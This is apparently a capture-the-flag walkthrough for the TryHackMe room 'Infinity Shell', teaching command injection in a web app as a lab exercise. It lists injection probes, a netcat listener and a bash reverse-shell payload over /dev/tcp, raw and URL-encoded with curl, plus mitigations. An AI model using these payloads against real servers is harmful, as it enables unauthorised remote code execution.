# ♾️ Infinity Shell — TryHackMe Walkthrough

**Room:** [Infinity Shell](https://tryhackme.com/room/infinityshell)
**Difficulty:** Easy
**Category:** Web / Command Injection
**Tags:** Command Injection, RCE, Web, Linux

---

## 📋 Overview

Infinity Shell is a web room focused on **Command Injection** — a vulnerability where user input is passed unsanitised to a system shell command. Exploiting this gives direct Remote Code Execution (RCE) on the server.

---

## 🔧 Tools Used

- Browser / Burp Suite — Request interception
- `curl` — HTTP requests
- `netcat` — Reverse shell listener

---

## 🌐 Step 1: Explore the Application

Navigate to `http://<TARGET_IP>`. The application appears to run system commands (e.g., a ping utility or similar tool). Identify the input field used to supply data to the command.

---

## 🔍 Step 2: Test for Command Injection

Use command chaining characters to append additional commands:

```bash
# Semicolon — run second command regardless
127.0.0.1; id

# AND — run if first succeeds
127.0.0.1 && whoami

# Pipe — pass output to command
127.0.0.1 | ls

# Backtick — command substitution
`id`
```

If `id` or `whoami` output appears in the response, command injection is confirmed.

---

## 🐚 Step 3: Get a Reverse Shell

Set up a listener on your attacking machine:

```bash
nc -lvnp 4444
```

Inject a reverse shell payload:

```bash
; bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

Or use a URL-encoded version via curl:

```bash
curl "http://<TARGET_IP>/vulnerable?input=127.0.0.1;bash+-i+>%26+/dev/tcp/<YOUR_IP>/4444+0>%261"
```

---

## 🚩 Step 4: Capture the Flag

Once you have a shell, find the flag:

```bash
find / -name "flag*" 2>/dev/null
cat /flag.txt
cat /home/<user>/flag.txt
```

> 🚩 **Flag:** Found in the filesystem after gaining a shell via command injection.

---

## 📝 Key Takeaways

- **Command injection** is caused by passing user input directly to OS-level functions without sanitisation.
- In PHP, vulnerable functions include `system()`, `exec()`, `shell_exec()`, `passthru()`.
- Mitigations: avoid calling shell commands from web apps, use language-native APIs, and sanitise all input.
- Always URL-encode special characters when injecting via GET parameters.

---

## 🔗 References

- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [TryHackMe — Infinity Shell Room](https://tryhackme.com/room/infinityshell)
- [Walkthrough Reference](https://medium.com/@andreydolya/tryhackme-infinity-shell-write-up-38acdb2e651e)
